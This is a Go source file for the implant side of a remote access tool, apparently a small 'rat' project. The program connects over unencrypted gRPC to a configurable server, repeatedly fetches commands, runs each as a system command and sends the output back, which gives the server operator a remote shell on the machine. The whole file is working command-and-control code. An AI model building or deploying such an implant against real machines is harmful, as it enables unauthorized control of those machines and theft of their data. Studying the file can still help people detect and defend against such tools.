package main

import (
	"context"
	"log"
	"os/exec"
	"strings"
	"time"

	"github.com/soeirosantos/rat/grpcapi"
	"github.com/soeirosantos/rat/pkg/util"
	"google.golang.org/grpc"
)

func main() {
	opts := []grpc.DialOption{grpc.WithInsecure()}

	var conn *grpc.ClientConn
	var err error
	if conn, err = grpc.Dial(util.Getenv("robot_server", "localhost:9091"), opts...); err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	client := grpcapi.NewRobotClient(conn)

	ctx := context.Background()

	for {
		fetch, err := client.Fetch(ctx, &grpcapi.FetchRequest{})
		if err != nil {
			// shouldn't kill the robot here but retry
			log.Fatal(err)
		}
		if len(fetch.Command) == 0 {
			time.Sleep(3 * time.Second)
			continue
		}

		tokens := strings.Split(fetch.Command, " ")
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}
		buf, err := c.CombinedOutput()
		if err != nil {
			client.Send(ctx, &grpcapi.SendRequest{Output: err.Error()})
		}
		client.Send(ctx, &grpcapi.SendRequest{Output: string(buf)})
	}
}
